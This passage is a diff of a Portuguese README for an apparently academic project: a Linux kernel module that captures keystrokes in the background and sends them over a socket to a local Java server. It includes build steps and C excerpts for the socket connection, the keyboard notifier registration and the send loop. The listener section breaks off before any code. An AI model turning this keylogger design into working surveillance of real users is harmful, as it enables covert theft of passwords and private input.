@@ -10,23 +10,32 @@ Por: **Caio O. Godinho**, **Hugo H. Nakamura** e **Isaac S. Soares**.
 **Esse código foi realizado e executado na distribuição de Linux Ubuntu 23.04. Em outros sistemas derivados, algumas execuções podem não funcionar!**
 
 ## **1. Composição do projeto.**
-O projeto é composto por programas em *kernel space* e *user space*. O módulo kernel, responsável por escanear a entrada de teclado no sistema e enviar a um servidor, é inteiramente composto por C. A implementação do servidor e sua interface foi feita a partir de Java 8, utilizando as bibliotecas do JavaFX.
+O projeto foi desenvolvido com o propósito de ser um driver de kernel capaz de escanear as teclas do teclado e enviar a um usuário externo conectado, funcionando por trás do uso principal do sistema.
+
+Dessa forma, o usuário externo é um servidor, implementado em **user space** na linguagem Java, com interface JavaFX. O driver é um módulo kernel que deve ser inserido manualmente, implementado em C no **kernel space**.
 
 ## **2. Requisitos**
-* Arquivos headers de kernel;
-* JDK Java 8 com javaFX;
 * Apache ant;
+* JDK Java 8 com javaFX;
+* Arquivos headers de kernel;
 
 ## **3. Instalação dos requisitos.**
-
-A execução do servidor depende do compilador Apache Ant e do pacote de desenvolvedor Java JDK 8. Caso você não possua instalado, basta copiar o código abaixo no terminal e executar.
+### **3.1. Java JDK 8 e Apache Ant**
+A execução do servidor depende do compilador Apache Ant. Caso você não possua instalado, basta copiar o código abaixo no terminal e executar.
 
 ```
-$ sudo apt install default-jdk
 $ sudo apt install ant
 ```
 
-Além disso, é preciso obter as bibliotecas que lidam com a execução de programas em kernel. Para saber se essas bibliotecas estão instaladas no seu sistema, execute
+Também é preciso ter o pacote de desenvolvedor Java 8. No site oficial da Oracle "https://www.oracle.com/br/java/technologies/javase/javase8-archive-downloads.html" você pode baixar o binário do **Java SE Development Kit 8u202** e executar no terminal
+
+```
+$ sudo tar -C /usr/java -zxf <nome do arquivo binário>.tar.gz
+```
+
+### **3.2. Arquivos headers de kernel.**
+
+Para saber se essas bibliotecas estão instaladas no seu sistema, execute
 
 ```
 $ uname -r
@@ -39,7 +48,7 @@ Caso você não tenha as bibliotecas, execute
 $ sudo apt-get install build-essential linux-headers-`uname -r`
 ```
 
-## **Guia de execução.**
+## **4. Guia de execução.**
 
 1. Compile todos os arquivos executando:
 ```
@@ -48,7 +57,7 @@ $ make
 2. Abra o servidor executando:
 
 ```
-$ make start*
+$ make start
 ```
 3. Com o servidor aberto, é preciso pressionar **"Abrir servidor"**, para que ele comece a aceitar conexões. Nessa etapa, é importante verificar se o IP é **127.0.0.1** e a porta **8008**.
 
@@ -64,3 +73,67 @@ $ make insert
 $ make remove
 ```
 
+## **5. Resumo do módulo.**
+
+### **5.1. Conexão com o servidor.**
+A rotina de conexão com o servidor é a primeira rotina executada ao ínicio do módulo. Nela, define-se o IP e configura a conexão. Depois conecta-se o socket do cliente. No trecho abaixo, há apenas a parte principal da rotina.
+
+```
+//Define o endereço de IP.
+unsigned char ip[5] = {127,0,0,1,'\0'};
+
+//Reserva memória no endereço 'endereco'.
+memset(&endereco, 0, sizeof(endereco));
+
+//Configura a conexão com o endereço IPV4, na porta 8008 no IP definido.
+endereco.sin_family = AF_INET;
+endereco.sin_port = htons(8008);
+endereco.sin_addr.s_addr = htonl(criaEndereco(ip));
+
+//Conecta o cliente ao servidor externo.
+socket->ops->connect(socket, (struct sockaddr*)&endereco, sizeof(endereco), O_RDWR);
+
+//Iniciar o notifier do teclado.
+register_keyboard_notifier(&keysniffer_blk);
+
+```
+
+
+### **5.2. Rotinas de envio de mensagem.**
+
+```
+//Cria a struct do tipo msghdr.
+struct msghdr msg;
+
+//Define o struct de mensagem.
+msg.msg_name = 0;
+msg.msg_namelen = 0;
+msg.msg_control = NULL;
+msg.msg_controllen = 0;
+msg.msg_flags = flags;
+
+//Enviar a mensagem ao servidor.
+while(1){
+    //Estrutura de buffer.
+    vec.iov_len = left;
+    vec.iov_base = (char *)mensagem + written;
+
+    //Retorna o número de bytes enviados.
+    len = kernel_sendmsg(localSocket, &msg, &vec, left, left);
+
+    //Ao receber constantes do sistema, ignora e prossegue enviando.
+    if(len == -ERESTARTSYS || !(flags & MSG_DONTWAIT) && len == -EAGAIN)
+        continue;
+
+    //Caso ainda haja bytes para enviar.
+    if(len > 0){
+        written += len;
+        left -= len;
+        if(left)
+            continue;
+    }
+    break;
+}
+```
+
+### **5.3. Listener das teclas**
